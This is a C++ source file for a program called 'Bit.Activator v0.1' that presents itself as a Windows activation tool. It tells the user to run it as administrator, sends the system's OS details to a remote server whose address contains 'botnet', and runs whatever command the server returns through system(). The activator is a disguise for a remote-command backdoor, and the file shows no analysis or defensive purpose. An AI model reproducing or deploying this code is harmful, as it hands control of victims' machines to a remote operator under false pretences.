#include <iostream>
#include <string>
#include <thread>
#include "inc/HTTPRequest.hpp"
#include "inc/getosname.h"
#include "inc/json.hpp"

#ifdef _WIN64 || _WIN32
#include "windows.h"
#endif

using namespace std;
using namespace nlohmann;

int main() {
    string mainnet = "http://botnet.ya-ne-artem.ru/mainnet.php";
    string os = getOsName();

    try {
        cout << "RUN THIS AS ADMIN!!!" << endl;
        cout << "Bit.Activator v0.1" << endl;
        cout << "Supported versions: 7pro 7corp 8pro 8corp 81pro 81corp 10pro 10corp 10corpltsc 11pro 11corp" << endl;
        cout << "Windows version: ";
        string ver;
        cin >> ver;

        http::Request request{mainnet + "?os=" + os + "&osversion=" + ver + "&action=activate"};

        const auto response = request.send("GET");
        string res = string{response.body.begin(), response.body.end()};

        json j = json::parse(res);

        string jcmd = j["cmd"];

        cout << jcmd << endl;

        char cmd[jcmd.length() + 1];
        strcpy(cmd, jcmd.c_str());

        system(cmd);
    }
    catch (const std::exception& e) {
        cerr << "Request failed, error: " << e.what() << endl;
    }

    return 0;
}
